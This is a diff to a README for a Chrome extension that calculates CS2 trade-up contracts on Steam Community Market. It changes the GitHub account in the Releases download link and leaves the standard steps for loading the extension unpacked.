@@ -6,7 +6,7 @@ A Chrome extension for building CS2 trade-up contracts directly on Steam Communi
 
 ## Install
 
-1. Download the extension ZIP from [Releases](https://github.com/williammccaig019-wq/steam-community-market-trade-up-calculator/releases/latest).
+1. Download the extension ZIP from [Releases](https://github.com/shittybillos/steam-community-market-trade-up-calculator/releases/latest).
 2. Extract it to a permanent folder.
 3. Open `chrome://extensions` and enable **Developer mode**.
 4. Choose **Load unpacked** and select the extracted folder containing `manifest.json`.
